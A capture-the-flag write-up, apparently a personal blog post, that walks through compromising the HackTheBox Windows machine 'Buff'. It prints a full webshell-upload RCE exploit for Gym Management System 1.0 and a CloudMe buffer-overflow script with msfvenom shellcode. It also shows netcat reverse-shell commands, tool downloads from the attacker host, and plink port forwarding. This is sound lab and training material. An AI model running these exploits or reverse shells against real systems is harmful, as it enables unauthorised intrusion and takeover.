---
title: Buff - HackTheBox
published: true
---

![](assets/img/buff-htb/icon.png)

**Hey guys!** In this blog-post we are going to pwn **Buff** from [HackTheBox](https://hackthebox.eu).

**Buff** is an easy rated windows box. Before we begin, a brief summary of what we are going to do :
* We scan the box to find a web-service.
* The web service is running a vulnerable open source project.
* We exploit it to get user on the box.
* Then we find another service that is running locally on the box.
* We exploit it to get administrator on the box.

With that said, let us begin.

![](assets/img/buff-htb/meme-1.gif)


# [](#header-1)SCANNING :

```
┌──(root💀nehal)-[~]
└─# nmap -sC -sV 10.129.135.106
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 04:16 IST
Nmap scan report for 10.129.135.106
Host is up (0.30s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.72 seconds
```

Nmap reveals we have a web-service on port 8080 running **Apache httpd 2.4.43**.

We can also do a full-ports scan to see if we miss anything. But that would not be necessary here.

Let us now move to enumeration.

# [](#header-1)ENUMERATION :

When we take a look at the web-service, we are greeted with the below page :

![](assets/img/buff-htb/8080-home.png)

It seems some sort of gym-based website.

If we look below, we get to see the copyright for `projectworlds.in`.

![](assets/img/buff-htb/8080-footer.png)

If we go the site, we can see a project called `Gym Management System Project in PHP`.

![](assets/img/buff-htb/projectworld-GymM.png)

The UI in the iframe looks same as our web-service UI. So we have `ProjectWorlds`'s `Gym Management System` running on the server.

Now let us see if we can find any exploit for this project.

```
┌──(root💀nehal)-[~]
└─# searchsploit gym management
-------------------------------------------------------------------------------------------------- -----------------------
 Exploit Title                                                                                    |  Path
-------------------------------------------------------------------------------------------------- -----------------------
Gym Management System 1.0 - 'id' SQL Injection                                                    | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                                 | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                                           | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution                                 | php/webapps/48506.py
-------------------------------------------------------------------------------------------------- -----------------------
Shellcodes: No Results
```

Apart from the other exploits, the `Gym Management System 1.0 - Unauthenticated Remote Code Execution` should catch our eye, since we do not have any credentials.

Let us mirror it in our current directory and see how it works.

```python
import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'upload/kamehameha.php'
        getdir  = {'telepathy': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL
            r2.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = raw_input(term)
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def header():
    BL   = Style.BRIGHT+Fore.GREEN
    RS   = Style.RESET_ALL
    FR   = Fore.RESET
    SIG  = BL+'            /\\\n'+RS
    SIG += Fore.YELLOW+'/vvvvvvvvvvvv '+BL+'\\'+FR+'--------------------------------------,\n'
    SIG += Fore.YELLOW+'`^^^^^^^^^^^^'+BL+' /'+FR+'============'+Fore.RED+'BOKU'+FR+'====================="\n'
    SIG += BL+'            \/'+RS+'\n'
    return SIG

if __name__ == "__main__":
    print header();
    if len(sys.argv) != 2:
        print formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
        print formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0])
        sys.exit(-1)
    SERVER_URL = sys.argv[1]
    UPLOAD_DIR = 'upload.php?id=kamehameha'
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    s = requests.Session()
    s.get(SERVER_URL, verify=False)
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'file': 
                  (
                    'kaio-ken.php.png', 
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>', 
                    'image/png', 
                    {'Content-Disposition': 'form-data'}
                  ) 
              }
    fdata   = {'pupload': 'upload'}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
    webshell(SERVER_URL, s)
```

The exploit first makes a GET request to `/upload.php?id=kamehameha`. Then it creates a malicious PNG file where it implants a backdoor that will run any system command that is supplied to a `telepathy` parameter. Then it makes a POST request to the URL to upload the malicious PNG file. Finally it triggers the `webshell()` function to provide us a web shell.

Now let us run the exploit and see if it works.

```
┌──(root💀nehal)-[~]
└─# python 48506.py http://10.129.135.106:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun

C:\xampp\htdocs\gym\upload>
```

# [](#header-1)SHELL AS SHAUN :

Let us get out of this web shell and get a real shell for `shaun`. I am transferring `nc.exe` from my local box for the same.

```
C:\xampp\htdocs\gym\upload> powershell -c Invoke-WebRequest -Uri http://10.10.14.57/nc.exe -OutFile nc.exe
�PNG
▒

C:\xampp\htdocs\gym\upload> dir
�PNG
▒
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

28/05/2021  18:36    <DIR>          .
28/05/2021  18:36    <DIR>          ..
28/05/2021  18:33                53 kamehameha.php
28/05/2021  18:36            59,392 nc.exe
               2 File(s)         59,445 bytes
               2 Dir(s)   7,998,971,904 bytes free

C:\xampp\htdocs\gym\upload> 
```

Now we need to set up a listener and get a reverse connection via `nc.exe`.

```
C:\xampp\htdocs\gym\upload> nc.exe 10.10.14.57 443 -e powershell.exe
```

```
┌──(root💀nehal)-[~]
└─# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.135.106] 49757
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\gym\upload> whoami
whoami
buff\shaun
PS C:\xampp\htdocs\gym\upload>
```

And we have shell as `Shaun`. You can read the user flag now.

![](assets/img/buff-htb/meme-2.gif)

Allright, it's time for privilege escalation.

# [](#header-1)PRIVILEGE ESCALATION :

When we enumerate the user `Shaun`'s home directory, we find an interesting thing.

```
PS C:\Users\Shaun\Downloads> ls
ls


    Directory: C:\Users\Shaun\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe                                                      


PS C:\Users\Shaun\Downloads>
```

We can see the `exe` file of `CloudMe`. Probably we have CloudMe service running locally on the box.

We can confirm it by looking for listening ports on the system.

```
PS C:\Users\Shaun\Downloads> netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       952
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       516
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5348
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       528
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1048
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1536
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2168
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       692
  TCP    10.129.135.106:139     0.0.0.0:0              LISTENING       4
  TCP    10.129.135.106:8080    10.10.14.57:60568      ESTABLISHED     5348
  TCP    10.129.135.106:49757   10.10.14.57:443        ESTABLISHED     7688
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       2636
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       6556
```

As we can see, we have port 8888 listening on localhost. So the CloudMe service is running on this port.

Let us see if we have any exploit for CloudMe. 

```
┌──(root💀nehal)-[~]
└─# searchsploit cloudme
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                             | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                                    | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                                    | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                                   | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                                            | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                                     | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                                        | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                                    | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                                           | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                                            | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                                         | windows_x86-64/remote/44784.py
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We see for version 1.11.2 of CloudMe, we have a Buffer Overflow exploit.

Let us mirror it and see what it is.

```python
import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload    = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
payload   += b"\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
payload   += b"\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
payload   += b"\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
payload   += b"\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
payload   += b"\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
payload   += b"\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
payload   += b"\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
payload   += b"\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
payload   += b"\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
payload   += b"\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
payload   += b"\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
payload   += b"\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
payload   += b"\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
payload   += b"\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
payload   += b"\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
payload   += b"\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun 

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)
```

It seems we need to create a msfvenom payload and replace the output with the contents of the `payload` variable. Let us do it.

```
┌──(root💀nehal)-[~]
└─# msfvenom -a x86 --platform windows -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.57 8080 -e cmd.exe' -b '\x00\x0A\x0D' -f python > tmp.txt
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 273 (iteration=0)
x86/shikata_ga_nai chosen with final size 273
Payload size: 273 bytes
Final size of python file: 1334 bytes
┌──(root💀nehal)-[~]
└─# sed 's/buf/payload/g' tmp.txt 
payload =  b""
payload += b"\xdb\xd8\xd9\x74\x24\xf4\x5d\xbe\x8a\xf9\xae\xcf\x29"
payload += b"\xc9\xb1\x3e\x31\x75\x19\x03\x75\x19\x83\xed\xfc\x68"
payload += b"\x0c\x52\x27\xee\xef\xab\xb8\x8e\x66\x4e\x89\x8e\x1d"
payload += b"\x1a\xba\x3e\x55\x4e\x37\xb5\x3b\x7b\xcc\xbb\x93\x8c"
payload += b"\x65\x71\xc2\xa3\x76\x29\x36\xa5\xf4\x33\x6b\x05\xc4"
payload += b"\xfc\x7e\x44\x01\xe0\x73\x14\xda\x6f\x21\x89\x6f\x25"
payload += b"\xfa\x22\x23\xa8\x7a\xd6\xf4\xcb\xab\x49\x8e\x92\x6b"
payload += b"\x6b\x43\xaf\x25\x73\x80\x95\xfc\x08\x72\x62\xff\xd8"
payload += b"\x4a\x8b\xac\x24\x63\x7e\xac\x61\x44\x60\xdb\x9b\xb6"
payload += b"\x1d\xdc\x5f\xc4\xf9\x69\x44\x6e\x8a\xca\xa0\x8e\x5f"
payload += b"\x8c\x23\x9c\x14\xda\x6c\x81\xab\x0f\x07\xbd\x20\xae"
payload += b"\xc8\x37\x72\x95\xcc\x1c\x21\xb4\x55\xf9\x84\xc9\x86"
payload += b"\xa2\x79\x6c\xcc\x4f\x6e\x1d\x8f\x05\x71\x93\xb5\x68"
payload += b"\x71\xab\xb5\xdc\x19\x9a\x3e\xb3\x5e\x23\x95\xf7\x90"
payload += b"\x69\xb4\x5e\x38\x34\x2c\xe3\x25\xc7\x9a\x20\x53\x44"
payload += b"\x2f\xd9\xa0\x54\x5a\xdc\xed\xd2\xb6\xac\x7e\xb7\xb8"
payload += b"\x03\x7f\x92\xfa\x99\x23\x65\x9c\xb0\xab\xe5\x02\x23"
payload += b"\x3f\x62\xd4\xd0\xcc\x36\x4d\x6e\x5f\x9b\xe4\xe0\xf3"
payload += b"\x4c\x66\x65\x57\xfd\x0b\x4b\x02\x79\xa9\xb3\xfd\x49"
payload += b"\x1f\x85\xcd\x87\x6e\xd1\x03\xed\xa7\x39\x63\x3d\xf0"
payload += b"\x09\xb3\x10\x65\x4a\xd0\x07\x01\xa4\x73\xa0\xac\xb8"
```

We are using the same `nc.exe` that we uploaded before, to get a reverse connection.

Since the service is running on localhost, we need to do port forwarding to access the service from our box.

For this purpose, I am using `plink.exe` to create a remote port forwarding connection to our box. 

```
PS C:\Users\Shaun\Downloads> Invoke-WebRequest -Uri http://10.10.14.57/plink.exe -OutFile plink.exe
Invoke-WebRequest -Uri http://10.10.14.57/plink.exe -OutFile plink.exe
PS C:\Users\Shaun\Downloads> dir
dir


    Directory: C:\Users\Shaun\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe                                                      
-a----       28/05/2021     18:48         645872 plink.exe                                                             


PS C:\Users\Shaun\Downloads>
```

However, to run plink, we need to have `cmd.exe`. Also, do not forget to enable the `SSH` service on our box.

```
C:\Users\Shaun\Downloads>plink.exe -l root -pw root -P 2222 10.10.14.57 -R 8888:127.0.0.1:8888
plink.exe -l root -pw root -P 2222 10.10.14.57 -R 8888:127.0.0.1:8888
The server's host key is not cached. You have no guarantee
that the server is the computer you think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 255 SHA256:m7JmUdX2XjvOdg8QuiBeyktfQq6nJ8GyToz20NtBw3w
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n, Return cancels connection, i for more info) y
Using username "root".
Linux nehal 5.9.0-kali1-amd64 #1 SMP Debian 5.9.1-1kali2 (2020-10-29) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat May 29 03:37:36 2021 from 10.129.25.107
┏━(Message from Kali developers)
┃
┃ This is a minimal installation of Kali Linux, you likely
┃ want to install supplementary tools. Learn how:
┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run “touch ~/.hushlogin” to hide this message)
root@nehal:~# 
```

Now, we need to set up a listener on the specified port and run the exploit.

```
┌──(root💀nehal)-[~]
└─# python3 48389.py 
┌──(root💀nehal)-[~]
└─# 
```

```
┌──(root💀nehal)-[~]
└─# nc -nlvp 8080
listening on [any] 8080 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.25.107] 49681
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator

C:\Windows\system32>
```

And we are `administrator`. 

![](assets/img/buff-htb/meme-3.gif)

Now, you can read the root flag too.

So, that was **Buff** from **HackTheBox**. 

**Thanks** for reading this far. Hope you liked it.

I will see you in the next write-up. **PEACE**.

